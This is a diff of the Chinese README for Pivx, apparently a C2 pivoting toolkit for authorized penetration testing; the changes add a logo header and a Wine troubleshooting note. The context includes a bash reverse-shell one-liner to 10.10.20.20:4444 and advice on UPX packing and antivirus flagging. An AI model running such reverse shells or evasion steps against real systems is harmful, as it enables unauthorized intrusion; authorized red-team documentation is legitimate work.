@@ -1,13 +1,19 @@
-# Pivx 🕸️
-
-![Go](https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white)
-![DuckDB](https://img.shields.io/badge/DuckDB-1.0+-FFF000?logo=duckdb&logoColor=black)
-![Streamlit](https://img.shields.io/badge/Streamlit-1.36+-FF4B4B?logo=streamlit&logoColor=white)
-![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20WSL2-lightgrey)
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](../LICENSE)
-
 [English](../README.md) | [Español](README_es.md) | [Português](README_pt.md) | [中文](README_zh.md)
+
+<div align="center">
+  <img src="../assets/logo.svg" alt="Pivx Logo" width="120">
+  <h1>Pivx</h1>
+  <p><em>高保真混合帧 C2 跳板套件</em></p>
+  <br>
+
+  ![Go](https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go&logoColor=white)
+  ![Python](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white)
+  ![DuckDB](https://img.shields.io/badge/DuckDB-1.0+-FFF000?logo=duckdb&logoColor=black)
+  ![Streamlit](https://img.shields.io/badge/Streamlit-1.36+-FF4B4B?logo=streamlit&logoColor=white)
+  ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20WSL2-lightgrey)
+  [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](../LICENSE)
+
+</div>
 
 **用于授权渗透测试的网络跳板与路由工具。**
 Pivx 采用**混合帧（Hybrid Framing）**架构，在单条 WebSocket 连接上复用 **L3 隧道、L4 端口转发和 L7 SOCKS5**，实现**超低延迟** —— 无额外帧头开销，无需建立辅助连接。
@@ -188,6 +194,8 @@ make windows-amd64-upx # -> dist/pivx-agent-windows-amd64-upx.exe
 
 > **提示：**默认使用 UPX 变体以加快上传速度。仅在杀毒软件标记 UPX 打包时才改用普通二进制文件。构建机器上需要安装 `upx`（`apt install upx` / `brew install upx`）。
 
+> **故障排除 — Wine/Go 兼容性：**在基于 Linux 的沙箱分析环境中使用 Wine（8.0 或更低版本）运行 Windows Agent（`.exe`）将因 `bcryptprimitives.dll` 错误而失败。这不是 UPX 或 Agent 的缺陷 —— 这是一个已知的不兼容性，因为 Go 运行时（1.21+ 版本）需要此 Windows 加密 DLL，而旧版 Wine 未实现该 DLL。在原生 Windows 系统上，Agent 运行完全正常。
+
 二进制文件使用 `CGO_ENABLED=0`（完全静态，目标机器无需 libc 依赖）。部署示例：
 
 ```bash
@@ -338,6 +346,8 @@ bash -i >& /dev/tcp/10.10.20.20/4444 0>&1
 ```
 Pivx/
 ├── Makefile                  # 交叉编译（linux/amd64、arm64、win/amd64）
+├── assets/                   # Logo 和视觉资源
+│   └── logo.svg
 ├── agent/                    # Go Agent
 │   ├── go.mod
 │   ├── main.go               # WS 传输 + 控制 + 发现（防上行）
